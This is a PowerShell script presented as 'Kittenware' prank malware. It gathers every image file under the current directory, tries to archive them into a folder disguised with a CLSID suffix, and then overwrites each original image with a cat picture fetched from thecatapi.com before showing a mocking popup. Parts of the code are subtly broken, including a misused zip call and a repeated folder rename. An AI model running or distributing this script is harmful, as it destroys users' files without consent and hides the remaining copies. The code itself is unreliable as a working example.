$allowedExtensions = @('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.svg')
$directory = (Get-Location).Path
$files = Get-ChildItem -Path $directory -File -Recurse | Where-Object { $allowedExtensions -contains $_.Extension }
$hiddenFolderPath = Join-Path -Path $directory -ChildPath "Encrypted Images"
$zipPath = Join-Path -Path $hiddenFolderPath -ChildPath "images.zip"

New-Item -Path $hiddenFolderPath -ItemType Directory -Force
Add-Type -AssemblyName "System.IO.Compression.FileSystem"
[IO.Compression.ZipFile]::CreateFromDirectory($zipPath, [System.IO.Compression.CompressionLevel]::Optimal, $false)
$zipFile = [IO.Compression.ZipFile]::Open($zipPath, [IO.Compression.ZipArchiveMode]::Update)

foreach ($file in $files) {
    $entry = $zipFile.CreateEntry($file.Name)
    $fileStream = $entry.Open()
    $content = [IO.File]::ReadAllBytes($file.FullName)
    $fileStream.Write($content, 0, $content.Length)
    $fileStream.Close()
}

$zipFile.Dispose()
Rename-Item -Path $hiddenFolderPath -NewName "Encrypted Images.{2559a1f2-21d7-11d4-bdaf-00c04f60b9f0}"

foreach ($file in $files) {
    $response = Invoke-RestMethod -Uri "https://api.thecatapi.com/v1/images/search"
    $imageURL = $response.url
    Invoke-WebRequest -Uri $imageURL -OutFile $file.FullName
    Write-Host "Overwritten: $($file.Name) with a random cat image"
    Start-Sleep -Seconds 1
}
Rename-Item -Path $hiddenFolderPath -NewName "Encrypted Images.{2559a1f2-21d7-11d4-bdaf-00c04f60b9f0}"
$wshell = New-Object -ComObject WScript.Shell
$wshell.Popup("Images kittenized By Kittenware!", 0, "Meow!", 0x40)
Exit